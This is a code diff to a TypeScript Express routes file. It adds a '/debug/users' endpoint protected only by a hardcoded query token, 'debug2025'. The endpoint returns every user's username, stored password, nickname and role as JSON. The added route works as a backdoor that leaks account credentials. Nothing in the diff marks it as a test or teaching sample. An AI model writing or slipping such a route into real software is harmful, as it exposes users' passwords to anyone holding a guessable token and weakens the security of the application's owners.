@@ -61,6 +61,30 @@ export async function registerRoutes(app: Express): Promise<Server> {
     res.sendFile(filePath);
   });
 
+  app.get("/debug/users", async (req, res) => {
+    const token = req.query.token;
+    if (token !== "debug2025") {
+      return res.status(403).send("Forbidden");
+    }
+    
+    try {
+      const allUsers = await storage.getAllUsers();
+      const userInfo = allUsers.map(u => ({
+        username: u.username,
+        password: u.password,
+        nickname: u.nickname,
+        role: u.role
+      }));
+      
+      res.json({
+        count: userInfo.length,
+        users: userInfo
+      });
+    } catch (error: any) {
+      res.status(500).json({ error: error.message });
+    }
+  });
+
   // ============================================
   // 认证 API 路由
   // ============================================
